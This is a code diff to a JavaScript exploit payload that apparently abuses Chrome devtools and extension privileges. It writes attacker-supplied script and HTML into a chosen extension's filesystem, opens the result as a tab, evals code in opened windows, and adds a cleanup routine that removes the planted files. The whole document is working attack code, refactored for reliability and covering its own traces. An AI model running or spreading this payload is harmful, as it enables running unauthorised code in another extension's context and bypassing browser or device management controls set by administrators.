@@ -1,4 +1,4 @@
-function payload1() {
+(function() {
     if (!opener) {
         opener = window;
     }
@@ -33,38 +33,49 @@ function payload1() {
                 // w.setTimeout(function() {
                 const blob_url = new Blob(["alert(1)"], { type: "text/html" });
 
-                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function(fs) {
-                    fs.root.getFile('index.js', { create: true }, function(entry) {
-                        entry.remove('index.js', function() {
-                            fs.root.getFile('index.js', { create: true }, function(entry) {
-                                entry.createWriter(function(writer) {
-                                    writer.write(new Blob([`%%EXTJS%%`]))
+                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function(fs) {
+                    function removeFile(file) {
+                        return new Promise(function (resolve, reject) {
+                            fs.root.getFile(file, { create: true }, function (entry) {
+                                entry.remove(resolve);
+                            })
+                        });
+                    }
+                    function writeFile(file, data) {
+                        return new Promise((resolve, reject)=>{
+                            fs.root.getFile(file, { create: true }, function(entry) {
+                                entry.remove(function() {
+                                    fs.root.getFile(file, { create: true }, function(entry) {
+                                        entry.createWriter(function(writer) {
+                                            writer.write(new Blob([data]));
+                                            resolve(entry.toURL());
+                                        })
+                                    })
                                 })
                             })
                         })
-                    })
-                    fs.root.getFile('index.html', { create: true }, function(entry) {
-                        console.log('hi');
-                        entry.remove(function() {
-                            console.log('hi');
-
-                            fs.root.getFile('index.html', { create: true }, function(entry) {
-                                entry.createWriter(function(writer) {
-                                    writer.write(new Blob([`%%EXTHTML%%<script src=\"index.js\"></script>`]));
-                                    w.chrome.tabs.create({ url: entry.toURL() })
-                                })
-
-                            })
-                        }
-                        )
-                    })
-                })
+                    };
+                    if (d.cleanup) {
+                        console.log("cleaning up");
+                        debugger;
+                        await removeFile('index.js');
+                        await removeFile('index.html');
+                        alert("Cleaned up successfully!");
+                        cleanup();
+                        w.close();
+                        return;
+                    }
+                    await writeFile('index.js',`%%EXTJS%%`)
+                    const url = await writeFile('index.html', `%%EXTHTML%%<script src="./index.js"></script>`);
+                    w.close();
+                    w.chrome.tabs.create({ url });
+                    cleanup();
+                });
 
 
                 // }, 5000);
 
             }
-
             document.open();
             document.write(`
                 <style>
@@ -79,6 +90,7 @@ function payload1() {
                 <p> Typing 'cancel' in any prompt will cancel the current operation. </p>
                 <a href="devtools://devtools/bundled/devtools_app.html?experiments=true&ws=%%updaterurl%%">Re-open devtools</a>
                 <a href="javascript:void(0)" id="updater">Update payload</a>
+                <a href="javascript:void(0)" id="cleanup">Cleanup and reset for extension</a>
             `)
             document.close();
             document.title = "Dashboard";
@@ -92,7 +104,7 @@ function payload1() {
                         ws.close();
                         const w = open('', '_blank');
                         console.log(savedURL);
-                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank')}, 500);`);
+                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                         setTimeout(() => { location.reload() });
                     }
                     ws.send(JSON.stringify({
@@ -115,7 +127,7 @@ function payload1() {
                     }
                 }
             }
-            document.querySelector('#extdbg').onclick = function() {
+            function dbgext(cleanup) {
                 let x = null;
                 while (!x) {
                     x = prompt('Extension id?');
@@ -135,11 +147,19 @@ function payload1() {
 
                     ifr.contentWindow.postMessage({
                         type: "uidpass", passcode:
-                            ifrid
+                            ifrid,
+                        cleanup: cleanup
                     }, '*');
                     // console.log('hi');
                 }
+                // alert(1);
 
+            }
+            document.querySelector('#extdbg').onclick = function () {
+                dbgext(false);
+            }
+            document.querySelector('#cleanup').onclick = function () {
+                dbgext(true);
             }
             document.querySelector('#devdbg').onclick = function() {
                 var l_canceled = false;
@@ -168,5 +188,4 @@ function payload1() {
             setTimeout(resolve, ms);
         });
     }
-}
-export { payload1 }
+})
